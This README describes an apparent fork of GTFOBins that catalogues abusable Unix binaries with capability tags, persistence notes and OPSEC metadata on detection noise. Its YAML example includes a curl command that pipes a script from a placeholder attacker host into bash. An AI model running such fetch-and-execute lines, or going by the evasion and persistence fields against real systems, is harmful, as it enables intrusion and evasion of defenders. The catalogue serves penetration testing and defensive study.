# GTFOBins-Simplified

A tactical fork of [GTFOBins](https://gtfobins.github.io) — operator-focused, minimal cognitive load, fast lookup.

**Differences from upstream:**

| Upstream GTFOBins | This fork |
|---|---|
| Function-centric grouping | Capability tags (exec, read, write, spawn, …) |
| No risk metadata | OPSEC noise level, artifacts, difficulty |
| No OPSEC context | Per-binary persistence notes |
| Heavy SCSS/layout | Single `main.css`, JetBrains Mono only |
| No live search | Instant filter by name + capability |

---

## Data Model

Each binary is a YAML file in `_binaries/`. All fields:

```yaml
name: curl                        # binary name in PATH

capabilities:                     # one or more of:
  - exec                          #   exec, read, write, spawn
  - download                      #   upload, download, suid, sudo
  - upload                        #   bind, reverse-shell

required_permissions:
  level: user                     # user | sudo | suid | root
  notes: ""                       # optional clarification

difficulty: low                   # low | medium | high

opsec:
  noise: medium                   # low | medium | high
  artifacts:                      # files/logs left behind
    - "~/.bash_history"
  notes: ""                       # free-text OPSEC guidance

persistence_potential: false      # true/false
persistence_notes: ""             # how to weaponize for persistence

examples:
  - id: exec-basic
    description: "Execute a command."
    capabilities: [exec]
    command: |
      curl https://ATTACKER/payload.sh | bash
    notes: "Triggers pipe-to-shell heuristics."

references:
  - "https://gtfobins.github.io/gtfobins/curl/"

tags:
  - http
  - exfil
```

Full JSON Schema: [`schema/binary.schema.json`](schema/binary.schema.json)

---

## Directory Layout

```
_binaries/          # YAML data — one file per binary
_layouts/           # Jekyll templates (default + binary)
_includes/          # Reusable partials
assets/css/         # Single stylesheet
assets/js/          # Search/filter/copy JS
pages/              # index.html, 404.html
schema/             # JSON Schema + blank YAML template
scripts/            # migrate.py, validate.py
```

---

## Usage

### Site

```bash
gem install bundler jekyll
bundle install
bundle exec jekyll serve
# open http://localhost:4000
```

Keyboard shortcuts: `/` to focus search, `Esc` to clear. Click any command block to copy.

### Adding a binary

```bash
cp schema/binary.template.yaml _binaries/BINARY.yaml
# fill in all fields
python3 scripts/validate.py _binaries/BINARY.yaml
```

### Migrating from upstream GTFOBins

```bash
# single file
python3 scripts/migrate.py path/to/upstream/_binaries/curl.md

# batch
python3 scripts/migrate.py --dir path/to/upstream/_binaries/ --out _binaries/

# then validate
python3 scripts/validate.py _binaries/
```

Migration produces stubs with `# TODO` markers for OPSEC/difficulty fields that cannot be auto-derived.

### Validating entries

```bash
pip install pyyaml jsonschema
python3 scripts/validate.py _binaries/         # all
python3 scripts/validate.py _binaries/curl.yaml # single
```

---

## Contribution

1. Fork → branch → PR against `main`.
2. One file per binary. Filename must match the `name` field.
3. Run `validate.py` before opening the PR; CI will also run it.
4. OPSEC fields are **required** — do not leave `# TODO` in submitted entries.
5. Keep `command` blocks copy-pasteable exactly as written (replace `ATTACKER`/`PORT` as convention).
6. No marketing language. No "this is a powerful tool." Describe what it does.

See [`.github/CONTRIBUTING.md`](.github/CONTRIBUTING.md) for the full checklist.

---

## Capability Reference

| Tag | Meaning |
|---|---|
| `exec` | Arbitrary OS command execution |
| `read` | Read file contents |
| `write` | Write to files |
| `spawn` | Obtain an interactive shell |
| `upload` | Send data to a remote host |
| `download` | Fetch data from a remote host |
| `suid` | Exploitable when SUID bit is set |
| `sudo` | Exploitable via a sudo rule |
| `bind` | Open a listening socket |
| `reverse-shell` | Initiate an outbound shell connection |

---

## Noise Level Reference

| Level | Meaning |
|---|---|
| `low` | Unlikely to generate alerts; blends with normal traffic |
| `medium` | May appear in logs; EDR rules exist but are not universal |
| `high` | Reliably detected by modern EDR / AV / SIEM out of the box |

---

*Data in this repository is for authorized security testing and education only.*
